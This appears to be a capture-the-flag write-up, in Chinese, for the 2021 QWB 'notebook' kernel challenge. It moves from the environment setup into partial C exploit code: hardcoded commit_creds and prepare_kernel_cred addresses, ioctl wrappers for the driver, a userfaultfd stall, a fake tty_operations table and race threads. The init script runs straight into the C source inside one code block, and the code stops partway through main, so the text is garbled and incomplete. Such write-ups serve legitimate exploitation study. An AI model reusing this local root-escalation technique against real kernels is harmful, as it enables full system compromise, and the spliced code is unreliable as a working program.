# 2021qwb-notebook

## 信息收集

启动脚本如下：

```shell
#!/bin/sh
stty intr ^]
qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append "loglevel=3 console=ttyS0 oops=panic panic=1 kaslr" -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2>/dev/null -s
```

可见开启了SMEP、SMAP、KASLR、KPTI。

提取文件系统后查看目标驱动和内核保护：

```shell
$ checksec vmlinux
[*] '/home/ivan/kernel/2021qwb-notebook/vmlinux'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0xffffffff81000000)
    RWX:      Has RWX segments
$ checksec notebook.ko
[*] '/home/ivan/kernel/2021qwb-notebook/output/notebook.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)

```

init启动脚本如下：

```shell
$ cat init 
#!/bin/sh
/bin/mount -t devtmpfs devtmpfs /dev
chown root:tty /dev/console
chown root:tty /dev/ptmx
chown root:tty /dev/tty
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts

mount -t proc proc /proc
mount -t sysfs sysfs /sys

echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict

ifup eth0 > /dev/null 2>/dev/null

insmod notebook.ko
cat /proc/modules | grep notebook > /tmp/moduleaddr
chmod 777 /tmp/moduleaddr
chmod 777 /dev/notebook
poweroff -d 300 -f &
echo "Welcome to QWB!"

#sh

#define CHECK(expr)		\
  if ((expr) == -1) {		\
    do {            		\
      perror(#expr);		\
      exit(EXIT_FAILURE);	\
    } while (0);		\
  }

const uint64_t v_prepare_kernel_cred = 0xFFFFFFFF810A9EF0;
const uint64_t v_prepare_creds = 0xFFFFFFFF810A9D60;
const uint64_t v_commit_creds = 0xFFFFFFFF810A9B40;
const uint64_t v_work_for_cpu_fn = 0xFFFFFFFF8109EB90;
const uint64_t v_pty_unix98_ops = 0xFFFFFFFF81E8E320;
const uint64_t kOffset_pty_unix98_ops = 0xe8e320;
const uint64_t kOffset_ptm_unix98_ops = 0xe8e440;


#define FAULT_PAGE 0x41410000
#define TARGET_SIZE 0x2e0
#define SUPER_BIG 0x2000
#define MAX_PTY_SPRAY 64
#define MAX_CATCHERS 8


char* stuck_forever = (char*)(FAULT_PAGE);
int fd;
char buffer[4096];


static void hexdump(void* data, size_t size) {
  unsigned char* _data = data;
  for (size_t i = 0; i < size; i++) {
    if (i && i % 16 == 0) putchar('\n');
    printf("%02x ", _data[i]);
  }
  putchar('\n');
}


struct note_userarg {
  uint64_t idx;
  uint64_t size;
  char *buf;
};


struct k_note {
  uint64_t mem;
  uint64_t size;
} note_in_kernel[16];


static void add_note(int idx, uint64_t size, char *buf) {
  struct note_userarg n;
  n.idx = idx;
  n.size = size;
  n.buf = buf;
  ioctl(fd, 0x100, &n);
}


static void del_note(int idx) {
  struct note_userarg n;
  n.idx = idx;
  ioctl(fd, 0x200, &n);
}


static void edit_note(int idx, uint64_t size, char *buf) {
  struct note_userarg n;
  n.idx = idx;
  n.size = size;
  n.buf = buf;
  ioctl(fd, 0x300, &n);
}


static void gift() {
  struct note_userarg n;
  n.buf = buffer;
  ioctl(fd, 0x64, &n);
  memcpy(note_in_kernel, buffer, sizeof(note_in_kernel));
}


static void debug_display_notes() {
  gift();
  printf("Notes:\n");
  for (int i = 0; i < 16; i++) {
    printf("%d:\tptr = %#lx, size = %#lx\n", i, note_in_kernel[i].mem,
           note_in_kernel[i].size);
  }
}


static void register_userfault() {
  struct uffdio_api ua;
  struct uffdio_register ur;
  pthread_t thr;
  uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);

  CHECK(uffd);
  ua.api = UFFD_API;
  ua.features = 0;
  CHECK(ioctl(uffd, UFFDIO_API, &ua));
  if (mmap((void *)FAULT_PAGE, 0x1000, PROT_READ | PROT_WRITE,
           MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1,
           0) != (void *)FAULT_PAGE) {
    perror("mmap");
    exit(EXIT_FAILURE);
  }
  ur.range.start = (uint64_t)FAULT_PAGE;
  ur.range.len = 0x1000;
  ur.mode = UFFDIO_REGISTER_MODE_MISSING;
  CHECK(ioctl(uffd, UFFDIO_REGISTER, &ur));
  // I’m not going to respond to userfault requests, let those kernel threads
  // stuck FOREVER!

}


/* ————- Legacy from 2017 —————– */

struct tty_driver {};
struct tty_struct {};
struct file {};
struct ktermios {};
struct termiox {};
struct serial_icounter_struct {};

struct tty_operations {

        struct tty_struct *        (*lookup)(struct tty_driver *, struct file *, int); /*     0     8 */

        int                        (*install)(struct tty_driver *, struct tty_struct *); /*     8     8 */

        void                       (*remove)(struct tty_driver *, struct tty_struct *); /*    16     8 */

        int                        (*open)(struct tty_struct *, struct file *); /*    24     8 */

        void                       (*close)(struct tty_struct *, struct file *); /*    32     8 */

        void                       (*shutdown)(struct tty_struct *); /*    40     8 */

        void                       (*cleanup)(struct tty_struct *); /*    48     8 */

        int                        (*write)(struct tty_struct *, const unsigned char  *, int); /*    56     8 */

        /* — cacheline 1 boundary (64 bytes) — */

        int                        (*put_char)(struct tty_struct *, unsigned char); /*    64     8 */

        void                       (*flush_chars)(struct tty_struct *); /*    72     8 */

        int                        (*write_room)(struct tty_struct *); /*    80     8 */

        int                        (*chars_in_buffer)(struct tty_struct *); /*    88     8 */

        int                        (*ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*    96     8 */

        long int                   (*compat_ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*   104     8 */

        void                       (*set_termios)(struct tty_struct *, struct ktermios *); /*   112     8 */

        void                       (*throttle)(struct tty_struct *); /*   120     8 */

        /* — cacheline 2 boundary (128 bytes) — */

        void                       (*unthrottle)(struct tty_struct *); /*   128     8 */

        void                       (*stop)(struct tty_struct *); /*   136     8 */

        void                       (*start)(struct tty_struct *); /*   144     8 */

        void                       (*hangup)(struct tty_struct *); /*   152     8 */

        int                        (*break_ctl)(struct tty_struct *, int); /*   160     8 */

        void                       (*flush_buffer)(struct tty_struct *); /*   168     8 */

        void                       (*set_ldisc)(struct tty_struct *); /*   176     8 */

        void                       (*wait_until_sent)(struct tty_struct *, int); /*   184     8 */

        /* — cacheline 3 boundary (192 bytes) — */

        void                       (*send_xchar)(struct tty_struct *, char); /*   192     8 */

        int                        (*tiocmget)(struct tty_struct *); /*   200     8 */

        int                        (*tiocmset)(struct tty_struct *, unsigned int, unsigned int); /*   208     8 */

        int                        (*resize)(struct tty_struct *, struct winsize *); /*   216     8 */

        int                        (*set_termiox)(struct tty_struct *, struct termiox *); /*   224     8 */

        int                        (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); /*   232     8 */

        const struct file_operations  * proc_fops;       /*   240     8 */


        /* size: 248, cachelines: 4, members: 31 */

        /* last cacheline: 56 bytes */

};


struct tty_operations fake_ops;

/* ———————————————— */


sem_t edit_go;

void* victim_thread_edit(void* i) {
  sem_wait(&edit_go);
  edit_note((int)i, SUPER_BIG, stuck_forever);
  return NULL;
}


sem_t add_go;

void* victim_thread_add(void* i) {
  sem_wait(&add_go);
  add_note((int)i, 0x60, stuck_forever);
  return NULL;
}

int main(int argc, char *argv[]) {

  unsigned char cpu_mask = 0x01;
  sched_setaffinity(0, 1, &cpu_mask); // [1]
  char* name = calloc(1, 0x100);
  sem_init(&edit_go, 0, 0);
  sem_init(&add_go, 0, 0);
  register_userfault();

  fd = open("/dev/notebook", 2);
  CHECK(fd);

  for (int i = 0; i < MAX_CATCHERS; i++) {
    add_note(i, 0x60, name);
    edit_note(i, TARGET_SIZE, name);
  }
  puts("[=] Before dancing:");
  debug_display_notes();

  pthread_t thr;
